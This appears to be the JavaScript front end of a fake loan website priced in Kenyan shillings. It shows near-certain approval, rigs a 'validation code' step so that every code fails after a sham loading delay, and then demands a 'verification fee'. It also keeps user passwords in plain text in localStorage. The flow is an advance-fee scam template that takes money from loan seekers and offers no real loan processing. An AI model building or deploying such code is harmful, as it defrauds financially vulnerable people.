// Simulate user data - stored in localStorage for persistence
let users = JSON.parse(localStorage.getItem('users')) || [];
let loggedInUser = localStorage.getItem('loggedInUser') || null;
let selectedLoan = localStorage.getItem('selectedLoan') || null;

// Loan amounts for consistency
const loanAmounts = {
    personal: 50000,
    business: 500000,
    home: 1000000,
    education: 200000,
    medical: 300000,
    vehicle: 400000,
    wedding: 600000,
    vacation: 150000
};

// Toast notification function
function showToast(message, type = 'info') {
    const toastContainer = document.getElementById('toast-container');
    if (!toastContainer) {
        const container = document.createElement('div');
        container.id = 'toast-container';
        container.className = 'toast-container position-fixed top-0 end-0 p-3';
        container.style.zIndex = '1050';
        document.body.appendChild(container);
    }
    const toast = document.createElement('div');
    toast.className = `toast align-items-center text-white bg-${type} border-0`;
    toast.setAttribute('role', 'alert');
    toast.setAttribute('aria-live', 'assertive');
    toast.setAttribute('aria-atomic', 'true');
    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body">${message}</div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
    `;
    document.getElementById('toast-container').appendChild(toast);
    const bsToast = new bootstrap.Toast(toast);
    bsToast.show();
    toast.addEventListener('hidden.bs.toast', () => {
        toast.remove();
    });
}

// Register form handler
document.addEventListener('DOMContentLoaded', function() {
    const registerForm = document.getElementById('registerForm');
    if (registerForm) {
        registerForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const fullName = document.getElementById('fullName').value;
            const username = document.getElementById('username').value;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            if (password !== confirmPassword) {
                showToast('Passwords do not match', 'danger');
                return;
            }
            if (users.find(user => user.username === username)) {
                showToast('Username already exists', 'warning');
                return;
            }
            users.push({ fullName, username, phone, password });
            localStorage.setItem('users', JSON.stringify(users));
            showToast('Registration successful! Please login.', 'success');
            setTimeout(() => window.location.href = 'login.html', 2000);
        });
    }

    // Login form handler
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const user = users.find(u => u.username === username && u.password === password);
            if (user) {
                loggedInUser = username;
                localStorage.setItem('loggedInUser', username);
                showToast('Login successful!', 'success');
                setTimeout(() => window.location.href = 'loans.html', 1000);
            } else {
                showToast('Invalid credentials', 'danger');
            }
        });
    }

    // Loan selection
    const loanBtns = document.querySelectorAll('.loan-btn');
    loanBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            selectedLoan = this.getAttribute('data-loan');
            localStorage.setItem('selectedLoan', selectedLoan);
            window.location.href = 'payment.html';
        });
    });

    // Back buttons
    const backBtn = document.getElementById('backBtn');
    if (backBtn) {
        backBtn.addEventListener('click', function() {
            window.location.href = 'login.html';
        });
    }

    const backToLoansBtn = document.getElementById('backToLoansBtn');
    if (backToLoansBtn) {
        backToLoansBtn.addEventListener('click', function() {
            window.location.href = 'loans.html';
        });
    }

    // Payment page
    if (window.location.pathname.includes('payment.html')) {
        const verificationAmountEl = document.getElementById('verificationAmount');
        const proceedBtn = document.getElementById('proceedBtn');
        if (verificationAmountEl && selectedLoan) {
            const amount = loanAmounts[selectedLoan] || 0;
            const verificationFee = amount * 0.001;
            verificationAmountEl.textContent = `Ksh ${verificationFee.toLocaleString()}`;
        }
        if (proceedBtn) {
            proceedBtn.addEventListener('click', function() {
                window.location.href = 'validate.html';
            });
        }
    }

     // Payment result
    if (window.location.pathname.includes('payment.html')) {
        const resultDiv = document.getElementById('result');
        const codeInputDiv = document.getElementById('codeInput');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        if (loggedInUser && selectedLoan) {
            // Simulate validation
            const isValid = Math.random() > 0.01; // 70% chance of approval
            if (isValid) {
                resultDiv.innerHTML = `
                    <div class="alert alert-success">
                        <h4>Congratulations!</h4>
                        <p>You are eligible for the ${selectedLoan} loan.</p>
                    </div>
                `;
                codeInputDiv.style.display = 'block';
            } else {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <h4>Sorry!</h4>
                        <p>You are not eligible for the ${selectedLoan} loan at this time.</p>
                    </div>
                `;
            }
        } else {
            resultDiv.innerHTML = '<div class="alert alert-warning">Please login and select a loan first.</div>';
        }
    }

    // Validation result
    if (window.location.pathname.includes('validate.html')) {
        const resultDiv = document.getElementById('result');
        const codeInputDiv = document.getElementById('codeInput');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        if (loggedInUser && selectedLoan) {
            // Simulate validation
            const isValid = Math.random() > 0.01; // 70% chance of approval
            if (isValid) {
                resultDiv.innerHTML = `
                    <div class="alert alert-success">
                        <h4>Congratulations!</h4>
                        <p>You are eligible for the ${selectedLoan} loan.</p>
                        <p>Please enter the payment message sent to your phone and submit for <strong>instant processing</strong>.</p>
                    </div>
                `;
                codeInputDiv.style.display = 'block';
            } else {
                resultDiv.innerHTML = `
                    <div class="alert alert-danger">
                        <h4>Sorry!</h4>
                        <p>You are not eligible for the ${selectedLoan} loan at this time.</p>
                    </div>
                `;
            }
        } else {
            resultDiv.innerHTML = '<div class="alert alert-warning">Please login and select a loan first.</div>';
        }

        if (submitCodeBtn) {
            submitCodeBtn.addEventListener('click', function() {
                const code = document.getElementById('validationCode').value;
                const errorMessageDiv = document.getElementById('errorMessage');
                if (code.trim() === '') {
                    showToast('Please enter a code', 'warning');
                    return;
                }
                submitCodeBtn.disabled = true;
                submitCodeBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Loading...';
                setTimeout(() => {
                    showToast('Code not found. Please try again.', 'danger');
                    const amount = loanAmounts[selectedLoan] || 0;
                    const verificationFee = amount * 0.001;
                    errorMessageDiv.innerHTML = `Please enter a valid code or pay the verification amount of loan ${selectedLoan} Ksh ${verificationFee.toLocaleString()}.`;
                    errorMessageDiv.style.display = 'block';
                    submitCodeBtn.disabled = false;
                    submitCodeBtn.innerHTML = 'Submit Code';
                }, 3000);
            });
        }
    }
});
